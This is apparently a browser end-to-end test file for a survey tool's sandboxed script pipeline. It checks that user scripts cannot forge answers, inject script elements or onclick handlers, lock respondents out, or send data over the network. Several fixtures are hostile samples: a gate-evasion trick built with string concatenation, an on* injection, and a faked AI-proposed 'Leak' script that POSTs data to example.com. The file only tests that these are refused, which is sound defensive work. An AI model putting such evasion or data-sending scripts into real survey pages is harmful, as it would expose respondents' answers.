/**
 * ONE SCRIPT PIPELINE — Styles, animations & scripts is where survey JavaScript lives.
 *
 *   node scripts/ux-script-dom-test.mjs     (studio :3000 with AI_API_URL=fake:, runtime :3001)
 *
 * Before: a survey could carry JavaScript in two places that did not know about
 * each other — a script behaviour (sandboxed frame, `rs` api only) and the
 * "Custom code" fields (`new Function` against the live page, no teardown). A
 * `document.querySelector('.next-button')` in one was a silent no-op in the
 * other, listeners piled up, and errors reached no one.
 *
 * Now there is one: a script runs in the sandboxed frame against a MIRROR of
 * the page (document.querySelector, addEventListener, classList, style and
 * friends behave as written), and the host applies what it did through an
 * allow-list and puts it back when the page is left. This drives it all in a
 * real browser:
 *
 *   RUNTIME  rs.listen and the DOM side by side · one click is one handler call ·
 *            handlers survive React re-renders and do not accumulate across
 *            Next/Back · a migrated legacy customJs / branding.customJs still runs ·
 *            errors, warnings and a runaway loop are reported and contained ·
 *            a script cannot write an answer, an rs- class, a tag or an on* attribute ·
 *            nor hide / disable an answer input or a required question (D12)
 *   STUDIO   a legacy survey opens with its Custom code moved into the script list
 *            (and no Custom code section) · Intelligent mode writes a script that
 *            passes the same gate, applies, and runs · one the gate refuses is
 *            refused with the reason
 */
import assert from "node:assert/strict";
import { chromium } from "./lib/playwright.mjs";
import { sendPreview } from "./lib/preview.mjs";
import { openTab, switchMode } from "./lib/nav.mjs";

const STUDIO = process.env.STUDIO_URL ?? "http://localhost:3000";
const RUNTIME = process.env.RUNTIME_URL ?? "http://localhost:3001";
let passed = 0;
const ok = (m) => { passed++; console.log(`  ok   ${m}`); };

/* ------------------------------------------------------------------ fixture */
const survey = (over = {}) => ({
  meta: { id: "sd", code: "SD", title: "Script DOM", version: "1.0", schemaVersion: 1, status: "draft" },
  questions: [
    { id: "q1", code: "Q1", variableName: "Q1", type: "single_select", text: "Pick one", options: [{ code: 1, label: "Alpha" }, { code: 2, label: "Beta" }, { code: 3, label: "Gamma" }] },
    { id: "q2", code: "Q2", variableName: "Q2", type: "single_select", text: "Pick another", options: [{ code: 1, label: "Red" }, { code: 2, label: "Blue" }] },
  ],
  flow: [{ type: "page", id: "p1", questionIds: ["q1"] }, { type: "page", id: "p2", questionIds: ["q2"] }, { type: "end", id: "e1", status: "complete" }],
  logicFlow: { nodes: [], edges: [] }, displayRules: [], calculations: [], quotas: [], designs: [], variables: [], embeddedData: [], listFills: [], scripts: [],
  deployment: { clientSlug: "c", studySlug: "s", languages: ["en"], access: { mode: "open" } },
  ...over,
});
const beh = (id, script, target = { kind: "survey" }) => ({ id, label: id, target, effects: [], script });
const withScripts = (...b) => survey({ ux: { styles: [], animations: [], behaviors: b } });

const browser = await chromium.launch();
const open = async (def, selector = '[data-qid="q1"]') => {
  const page = await browser.newPage({ viewport: { width: 1200, height: 900 } });
  const logs = [], errs = [];
  page.on("console", (m) => logs.push(`${m.type()}: ${m.text()}`));
  page.on("pageerror", (e) => errs.push(String(e)));
  await page.goto(`${RUNTIME}/preview`, { waitUntil: "networkidle" });
  // scripts are page-scoped: what they set on <body> is put back when the page is left. A record of every
  // value ever set is what proves a handler ran (and how many times), whatever page the survey is on now.
  await page.evaluate(() => {
    window.__sets = [];
    new MutationObserver((rs) => { for (const r of rs) { const v = document.body.getAttribute(r.attributeName); if (v != null) window.__sets.push([r.attributeName, v]); } }).observe(document.body, { attributes: true });
  });
  await sendPreview(page, { definition: def }, { selector });
  return { page, logs, errs };
};
const attr = (page, name) => page.evaluate((n) => document.body.getAttribute(n), name);
const frames = (page) => page.evaluate(() => document.querySelectorAll("iframe[data-rs-ux-sandbox]").length);
const waitAttr = (page, name, value, t = 8000) => page.waitForFunction(([n, v]) => document.body.getAttribute(n) === v, [name, value], { timeout: t });
/** every value a script ever set on <body> under this name, in order */
const sets = (page, name) => page.evaluate((n) => window.__sets.filter((x) => x[0] === n).map((x) => x[1]), name);
const waitSet = (page, name, value, t = 8000) => page.waitForFunction(([n, v]) => window.__sets.some((x) => x[0] === n && x[1] === v), [name, value], { timeout: t });

/* ============================================================ RUNTIME */
console.log("\nRUNTIME — one pipeline");

{ // 1. rs.listen and document.querySelector, side by side; one click = one call
  const { page, errs } = await open(withScripts(
    beh("rsapi", `rs.listen("select", "Q1", (e) => { rs.addClass("Q1", "picked"); });`),
    beh("dom", `
      var next = document.querySelector('[data-testid="rs-next"]');
      var n = 0;
      next.addEventListener("click", function () { n++; document.body.setAttribute("data-next-clicks", String(n)); });
      for (const opt of document.querySelectorAll('[data-qid="q1"] [data-rs-el="option"]')) { opt.classList.add("zz-opt"); }
      document.body.setAttribute("data-ready", "1");`),
  ));
  await waitAttr(page, "data-ready", "1");
  assert.equal(await page.$$eval('[data-qid="q1"] .zz-opt', (e) => e.length), 3, "for…of over querySelectorAll reached all three real options");
  await page.click('[data-qid="q1"] label:has-text("Alpha")');
  await page.waitForFunction(() => /picked/.test(document.querySelector('[data-qid="q1"]').getAttribute("data-rs-ux-on") ?? "") || document.querySelector('[data-qid="q1"]').classList.contains("picked"), null, { timeout: 5000 });
  ok("rs.listen and the DOM api run side by side in the same survey: a select event, document.querySelectorAll + classList on the real options");
  await page.click('[data-testid="rs-next"]');
  await waitSet(page, "data-next-clicks", "1");
  await page.waitForTimeout(500);
  assert.deepEqual(await sets(page, "data-next-clicks"), ["1"], "one click, one handler call — not two");
  assert.equal(errs.length, 0, errs.join("\n"));
  await page.close();
  ok("document.querySelector('[data-testid=\"rs-next\"]').addEventListener — one real click is exactly one call");
}

{ // 2. handlers survive re-render, and do not pile up across navigation
  const { page } = await open(withScripts(
    beh("changes", `
      var n = 0;
      document.querySelector('[data-qid="q1"]').addEventListener("change", function () { n++; document.body.setAttribute("data-changes", String(n)); });
      document.body.setAttribute("data-ready", "1");`),
    beh("every-page", `
      var key = document.querySelector('[data-qid]').getAttribute("data-qid");
      var c = (document.body.getAttribute("data-visits") || "").split(",").filter(Boolean);
      c.push(key); document.body.setAttribute("data-visits", c.join(","));
      document.querySelector('[data-testid="rs-next"]') && document.querySelector('[data-testid="rs-next"]').addEventListener("click", function () { document.body.setAttribute("data-last-click", key); });`),
  ));
  await waitAttr(page, "data-ready", "1");
  await page.click('[data-qid="q1"] label:has-text("Alpha")');
  await waitSet(page, "data-changes", "1");
  await page.click('[data-qid="q1"] label:has-text("Beta")');   // React re-renders the card in between
  await waitSet(page, "data-changes", "2");
  await page.click('[data-qid="q1"] label:has-text("Gamma")');
  await waitSet(page, "data-changes", "3");
  await page.waitForTimeout(300);
  assert.deepEqual(await sets(page, "data-changes"), ["1", "2", "3"], "three answers, three change events — the listener survived every re-render, once each");
  ok("a listener on the question card survives React re-rendering it (3 answers → exactly 3 calls)");

  for (let round = 0; round < 3; round++) {
    await page.click('[data-testid="rs-next"]');
    await page.waitForSelector('[data-qid="q2"]');
    await page.waitForTimeout(500);
    assert.ok((await frames(page)) <= 2, `at most one frame per script on the page (got ${await frames(page)})`);
    await page.click('[data-testid="rs-back"]');
    await page.waitForSelector('[data-qid="q1"]');
    await page.waitForTimeout(500);
  }
  assert.ok((await frames(page)) <= 2, "no frames pile up across 3 Next/Back round trips");
  const visits = await sets(page, "data-visits");
  assert.ok(visits.every((v) => !v.includes(",")), `each visit starts from a clean page — the last visit's change was put back: ${visits}`);
  assert.equal(visits.filter((v) => v === "q1").length, 4, `the page-1 script started once per visit (1 + 3 returns): ${visits}`);
  assert.equal(visits.filter((v) => v === "q2").length, 3, `…and the page-2 script once per visit: ${visits}`);
  await page.click('[data-testid="rs-next"]');
  await page.waitForSelector('[data-qid="q2"]');
  await page.waitForTimeout(400);
  await page.click('[data-testid="rs-back"]');
  await page.waitForSelector('[data-qid="q1"]');
  await page.waitForTimeout(500);
  await page.click('[data-qid="q1"] label:has-text("Alpha")');
  await page.waitForFunction(() => window.__sets.filter((x) => x[0] === "data-changes").length >= 4, null, { timeout: 8000 });
  await page.waitForTimeout(400);
  assert.deepEqual(await sets(page, "data-changes"), ["1", "2", "3", "1"], "after navigation the page's script started fresh and one answer is one call — not one per visit");
  await page.close();
  ok("Next/Back ×3: every visit starts the page's scripts once, leaves none behind, and handlers do not accumulate");
}

{ // 3. a legacy survey: question customJs + branding.customJs still run (moved on load)
  const def = survey({
    branding: { customJs: `document.body.setAttribute("data-survey-js", "ran");` },
    questions: survey().questions.map((q) => (q.id === "q1" ? { ...q, customJs: `el.setAttribute("data-question-js", "ran"); el.querySelector("input").addEventListener("change", function () { document.body.setAttribute("data-legacy-changes", String((Number(document.body.getAttribute("data-legacy-changes")) || 0) + 1)); });` } : q)),
  });
  const { page, errs } = await open(def);
  await waitAttr(page, "data-survey-js", "ran");
  await page.waitForFunction(() => document.querySelector('[data-qid="q1"]').getAttribute("data-question-js") === "ran", null, { timeout: 8000 });
  assert.equal(await page.$('[data-testid="rs-question-script"]'), null, "the second script engine is gone");
  await page.click('[data-qid="q1"] label:has-text("Alpha")');   // the legacy script listens on the first input
  await waitSet(page, "data-legacy-changes", "1");
  await page.waitForTimeout(300);
  assert.deepEqual(await sets(page, "data-legacy-changes"), ["1"], "one change, one call");
  assert.equal(errs.length, 0, errs.join("\n"));
  await page.close();
  ok("a saved survey's question customJs (el, DOM listeners) and branding.customJs run unchanged — migrated into the pipeline, no duplicate");
}

{ // 4. errors, warnings, a runaway loop
  const { page, logs } = await open(withScripts(
    beh("typo", `document.querySelector('.next-button').addEventListener("click", function () {});`),
    beh("boom", `document.body.setAttribute("data-before-boom", "1"); null.x(); `),
    beh("spin", `document.body.setAttribute("data-spin-start", "1"); while (true) { } `),
    beh("ok", `document.body.setAttribute("data-fine", "yes");`),
  ));
  await waitAttr(page, "data-fine", "yes");
  await page.waitForTimeout(1500);
  const text = logs.join("\n");
  assert.match(text, /rescript:script.*typo.*\.next-button|\.next-button.*rs-next|rs-next/s, "a guessed selector is named, with the real hook");
  assert.match(text, /boom.*(null|Cannot read|TypeError)/s, "a thrown error is reported with the script's name");
  assert.match(text, /spin.*(loop|iterations|too long|stopped)/is, "a runaway loop is stopped and said so");
  assert.equal(await attr(page, "data-before-boom"), "1", "what ran before the error still took effect");
  assert.equal(await page.evaluate(() => 1 + 1), 2, "the page is responsive after the runaway loop");
  await page.click('[data-qid="q1"] label:has-text("Alpha")');
  assert.equal(await page.$eval('[data-qid="q1"] input:checked', (e) => e.value), "1", "answering still works");
  await page.close();
  ok("a guessed selector, a thrown error and an endless loop each name their script in the console; the loop is bounded and the rest of the page carries on");
}

{ // 5. what a script may not do
  const { page, logs } = await open(withScripts(
    beh("static-gate", `document.querySelector('[data-qid="q1"] input[value="2"]').checked = true; document.body.setAttribute("data-static-ran", "1");`),
    // spelled around the static gate on purpose: the host's allow-list is the second wall
    beh("bad", `
      var inp = document.querySelector('[data-qid="q1"] input[value="2"]');
      inp["check" + "ed"] = true; inp["dispatch" + "Event"](new Event("change", { bubbles: true }));
      document.querySelector('[data-qid="q1"]').classList.add("rs-hacked", "fine-class");
      var s = document.createElement("script"); s.textContent = "document.body.setAttribute('data-evil','1')"; document.body.appendChild(s);
      var d = document.createElement("div"); d.setAttribute("onclick", "document.body.setAttribute('data-evil','1')"); d.setAttribute("data-mine", "1"); d.textContent = "made by a script"; document.querySelector('[data-qid="q1"]').appendChild(d);
      document.body.setAttribute("data-done", "1");`),
  ));
  await waitAttr(page, "data-done", "1");
  await page.waitForTimeout(600);
  assert.equal(await attr(page, "data-static-ran"), null, "a script that writes an answer is refused before it runs…");
  assert.match(logs.join("\n"), /static-gate.*not run.*answer/s, "…and says why");
  assert.equal(await page.$('[data-qid="q1"] input:checked'), null, "…and one that gets past the static check still cannot answer for the respondent");
  assert.equal(await page.$eval('[data-qid="q1"]', (e) => e.classList.contains("rs-hacked")), false, "the survey's rs- class space is not a script's");
  assert.equal(await page.$eval('[data-qid="q1"]', (e) => e.classList.contains("fine-class")), true, "an ordinary class is applied");
  assert.equal(await attr(page, "data-evil"), null, "no script element, no on* attribute ran anything");
  assert.equal(await page.$('script[data-x], [data-rs-ux-created] script'), null, "no <script> was created");
  const made = await page.$('[data-mine="1"]');
  assert.ok(made, "a script may create its own plain element");
  assert.equal(await made.getAttribute("onclick"), null, "…without an on* attribute");
  assert.match(logs.join("\n"), /cannot|refus|not allowed|ignored/i, "each refusal is said in the console");
  await page.close();
  ok("a script cannot answer, add rs- classes, create <script> or on* handlers — each refusal is logged; ordinary classes and elements work");
}

{ // 6. undone when the page is left
  const { page } = await open(withScripts(beh("mark", `document.querySelector('[data-qid]').classList.add("page-mark"); document.body.setAttribute("data-mark", "1");`, { kind: "question", questionId: "q1" })));
  await waitAttr(page, "data-mark", "1");
  await page.click('[data-qid="q1"] label:has-text("Alpha")');
  await page.click('[data-testid="rs-next"]');
  await page.waitForSelector('[data-qid="q2"]');
  await page.waitForTimeout(600);
  assert.equal(await attr(page, "data-mark"), null, "a page's script changes are put back when the page is left");
  assert.equal(await frames(page), 0, "Q1's script is not running on Q2's page");
  await page.close();
  ok("leaving the page undoes what its script changed and removes its frame");
}

{ // 7. RUNTIME-08: a script cannot strand the respondent by hiding / disabling Next
  const { page, logs } = await open(withScripts(
    beh("strand", `
      var next = document.querySelector('[data-testid="rs-next"]');
      next.setAttribute("hidden", "true"); next.setAttribute("disabled", "true");
      next.classList.add("zz-next-styled");
      document.querySelector(".rs-nav").setAttribute("hidden", "true");
      document.body.setAttribute("data-strand-done", "1");`),
  ));
  await waitAttr(page, "data-strand-done", "1");
  await page.waitForTimeout(600);
  const next = await page.$eval('[data-testid="rs-next"]', (e) => ({ hidden: e.hasAttribute("hidden"), disabled: e.disabled, styled: e.classList.contains("zz-next-styled") }));
  assert.equal(next.hidden, false, "Next is not hidden by a script");
  assert.equal(next.disabled, false, "Next is not disabled by a script");
  assert.equal(next.styled, true, "…but a class on it is still applied");
  assert.equal(await page.$eval(".rs-nav", (e) => e.hasAttribute("hidden")), false, "the navigation bar is not hidden");
  assert.match(logs.join("\n"), /cannot (hide|disable) the Next/i, "the refusal is said in the console");
  await page.click('[data-qid="q1"] label:has-text("Alpha")');
  await page.click('[data-testid="rs-next"]');
  await page.waitForSelector('[data-qid="q2"]');
  await page.close();
  ok("RUNTIME-08: hidden/disabled on Next or .rs-nav is refused and logged; classes still apply; the respondent can always move on");
}

{ // 7b. D12 (audit 2026-10-30): a script cannot lock the respondent out of an answer
  const def = withScripts(
    beh("lockout", `
      var opt = document.querySelector('[data-qid="q1"] [data-rs-el="option"]');
      opt.setAttribute("hidden", "true"); opt.style.display = "none"; opt.style.pointerEvents = "none";
      opt.classList.add("zz-opt-styled");
      var inp = document.querySelector('[data-qid="q1"] input');
      if (inp) inp.setAttribute("disabled", "true");
      document.querySelector('[data-qid="q1"]').setAttribute("hidden", "true");
      rs.hide("Q1");
      document.body.setAttribute("data-lock-done", "1");`),
  );
  def.questions[0].required = true;
  const { page, logs } = await open(def);
  await waitAttr(page, "data-lock-done", "1");
  await page.waitForTimeout(600);
  const st = await page.evaluate(() => {
    const card = document.querySelector('[data-qid="q1"]');
    const opt = card.querySelector('[data-rs-el="option"]');
    const inp = card.querySelector("input");
    return { cardHidden: card.hasAttribute("hidden") || card.hasAttribute("data-rs-ux-hidden") || getComputedStyle(card).display === "none", required: card.getAttribute("data-rs-required"),
      optHidden: opt.hasAttribute("hidden") || getComputedStyle(opt).display === "none", optPe: getComputedStyle(opt).pointerEvents, optStyled: opt.classList.contains("zz-opt-styled"), inpDisabled: !!inp?.disabled };
  });
  assert.equal(st.required, "1", "the required card is marked for the host");
  assert.equal(st.cardHidden, false, "a required question card is not hidden by a script (attribute or rs.hide)");
  assert.equal(st.optHidden, false, "an option is not hidden by a script");
  assert.notEqual(st.optPe, "none", "an option keeps pointer events");
  assert.equal(st.inpDisabled, false, "an answer input is not disabled by a script");
  assert.equal(st.optStyled, true, "…but a class on the option is still applied");
  const said = logs.join("\n");
  assert.match(said, /cannot (hide|disable|set display: none on|set pointer-events: none on) an answer input/i, "the input refusal is said in the console");
  assert.match(said, /required question/i, "the required-card refusal is said in the console");
  await page.click('[data-qid="q1"] label:has-text("Alpha")');
  await page.click('[data-testid="rs-next"]');
  await page.waitForSelector('[data-qid="q2"]');
  await page.close();
  ok("D12: hidden/disabled/display:none/pointer-events:none on an option or input, and hiding a required card (attribute or rs.hide), are refused and logged; classes still apply; the respondent answers and moves on");
}

{ // 8. OR-01: an unknown question type is a visible notice, not a text box
  const def = survey({ questions: [{ id: "q1", code: "Q1", variableName: "Q1", type: "constant_sum", text: "Split 100 points", options: [{ code: 1, label: "A" }] }, survey().questions[1]] });
  const { page } = await open(def);
  await page.waitForSelector('[data-qid="q1"] [data-testid="rs-unsupported"]');
  assert.match(await page.textContent('[data-qid="q1"] [data-testid="rs-unsupported"]'), /not supported by this version/);
  assert.equal(await page.$('[data-qid="q1"] input[type="text"], [data-qid="q1"] textarea'), null, "no text box is drawn for it");
  await page.close();
  ok("OR-01: an unregistered question type renders the 'not supported by this version' card instead of a text input");
}

/* ============================================================ STUDIO */
console.log("\nSTUDIO — Properties and Intelligent mode");
const context = await browser.newContext({ viewport: { width: 1600, height: 1000 } });
const page = await context.newPage();
const pageErrors = [];
page.on("pageerror", (e) => pageErrors.push(String(e)));
const goTab = async (name) => { await openTab(page, name); await page.waitForTimeout(150); };
const loadDef = async (def) => {
  await goTab("JSON");
  await page.waitForSelector("textarea.code");
  await page.click('button:has-text("edit")');
  await page.$eval("textarea.code", (el, v) => { Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(el, v); el.dispatchEvent(new Event("input", { bubbles: true })); }, JSON.stringify(def));
  await page.click('button:has-text("validate & apply")');
  await page.waitForTimeout(1200);
  await goTab("Questions");
};
const readDef = async () => {
  await goTab("JSON");
  await page.waitForSelector("textarea.code");
  const json = await page.$eval("textarea.code", (e) => e.value);
  await goTab("Questions");
  return JSON.parse(json);
};
const selectCard = async (code) => { await page.click(`.qcard:has-text("${code}")`); await page.waitForTimeout(250); };

await page.goto(`${STUDIO}/sandbox?mode=studio`, { waitUntil: "networkidle" });
await page.waitForSelector(".block-badge");

{ // a legacy survey opens with its Custom code in the script list
  const legacy = survey({ meta: { ...survey().meta, id: "sandbox" }, branding: { customJs: `document.body.setAttribute("data-s", "1");` },
    questions: survey().questions.map((q) => (q.id === "q1" ? { ...q, customJs: `el.classList.add("legacy-mark");` } : q)) });
  await loadDef(legacy);
  const def = await readDef();
  assert.equal(def.questions.find((q) => q.id === "q1").customJs, undefined, "the field is gone from the question");
  assert.equal(def.branding?.customJs, undefined, "…and from the branding");
  const moved = def.ux.behaviors.map((b) => b.source).sort();
  assert.deepEqual(moved, ["branding_custom_js", "question_custom_js"], JSON.stringify(def.ux.behaviors.map((b) => [b.id, b.source])));
  await selectCard("Q1");
  assert.equal(await page.$('[data-testid="psec-head-custom-code"]'), null, "there is no Custom code section");
  const head = await page.$('[data-testid="psec-head-ux"]');
  assert.ok(head, "Styles, animations & scripts is the one place for it");
  if (!(await page.$('[data-testid="psec-body-ux"]'))) await head.click();
  await page.waitForSelector('[data-testid="ux-script"]');
  assert.match(await page.$eval('[data-testid="ux-script"]', (e) => e.value), /legacy-mark/, "the moved code is in the script editor, unchanged");
  assert.ok(await page.$('[data-testid="ux-script-moved"]'), "and says where it came from");
  ok("a survey saved with Custom code opens with it moved into Styles, animations & scripts — code unchanged, no Custom code section, nothing lost");
}

{ // Intelligent mode
  await switchMode(page, "intelligent");
  await page.waitForSelector('[data-testid="intelligent-view"]');
  const turns = () => page.$$('[data-testid="cp-turn"]');
  const say = async (text, reply) => {
    await page.evaluate((r) => window.__rescriptCopilotFake(r), reply);
    const k = (await turns()).length;
    await page.fill('[data-testid="iq-input"]', text);
    await page.keyboard.press("Enter");
    await page.waitForFunction((c) => { const t = document.querySelectorAll('[data-testid="cp-turn"]'); return t.length > c && t[t.length - 1].getAttribute("data-status") !== "thinking"; }, k, { timeout: 40000 });
    return (await turns()).at(-1);
  };
  const SCRIPT = `var next = document.querySelector('[data-testid="rs-next"]');
var n = 0;
next.addEventListener("click", function () { n++; document.body.setAttribute("data-ai-clicks", String(n)); });
document.body.setAttribute("data-ai-ready", "1");`;
  await say("When the respondent clicks Next, count the clicks on the page", {
    kind: "proposal", reply: "A script on Q1 that counts clicks on Next.",
    actions: [{ op: "create_behavior", label: "Count Next clicks", target: "Q1", script: SCRIPT }],
  });
  await page.waitForSelector('[data-testid="cp-panel-apply"]');
  assert.equal(await page.$('[data-testid="cp-refused"]'), null, "a script that uses document.querySelector passes the gate");
  await page.click('[data-testid="cp-panel-apply"]');
  await page.waitForTimeout(500);
  let def = await readDef();
  const made = def.ux.behaviors.find((b) => b.label === "Count Next clicks");
  assert.ok(made && made.script === SCRIPT, "Intelligent mode's JavaScript is stored as a script behaviour");
  ok("Intelligent mode writes JavaScript into Styles, animations & scripts, through the same gate as a hand-written script");

  // the generated script runs, for real, in the live survey
  const live = await open({ ...def, questions: def.questions, meta: { ...def.meta, id: "gen" } });
  await waitSet(live.page, "data-ai-ready", "1");
  await live.page.click('[data-qid="q1"] label:has-text("Alpha")');
  await live.page.click('[data-testid="rs-next"]');
  await waitSet(live.page, "data-ai-clicks", "1");
  await live.page.waitForTimeout(400);
  assert.deepEqual(await sets(live.page, "data-ai-clicks"), ["1"]);
  await live.page.close();
  ok("…and the script Intelligent mode wrote runs in the live survey (one Next click → one count)");

  // set_custom_code (JavaScript) lands in the same place, never in customJs
  await say("On Q2, add a class when the respondent picks an option", {
    kind: "proposal", reply: "Custom code on Q2 as a script.",
    actions: [{ op: "set_custom_code", target: "Q2", js: `rs.listen("select", "self", function (e) { rs.addClass("self", "chosen-" + e.option); });` }],
  });
  await page.waitForSelector('[data-testid="cp-panel-apply"]');
  await page.click('[data-testid="cp-panel-apply"]');
  await page.waitForTimeout(500);
  def = await readDef();
  assert.equal(def.questions.find((q) => q.id === "q2").customJs, undefined, "never written to the old field");
  assert.ok(def.ux.behaviors.some((b) => b.source === "copilot_custom_code" && b.target.questionId === "q2"), "a script behaviour on Q2");
  ok("set_custom_code writes a script behaviour (source copilot_custom_code), not the retired field");

  // a script the gate refuses is refused, with the reason
  await say("Send each answer to my server", {
    kind: "proposal", reply: "A script that posts answers.",
    actions: [{ op: "create_behavior", label: "Leak", target: "Q1", script: `fetch("https://example.com/collect", { method: "POST", body: "x" });` }],
  });
  await page.waitForSelector('[data-testid="cp-refused"]', { timeout: 15000 });
  assert.match(await page.textContent('[data-testid="cp-refused"]'), /fetch is not available/i, "the refusal names the reason");
  ok("a script that reaches for the network is refused on the card, with the reason — not applied, not silently dropped");
}

assert.deepEqual(pageErrors, [], pageErrors.join("\n"));
await browser.close();
console.log(`\nALL ${passed} SCRIPT-PIPELINE CHECKS PASSED`);
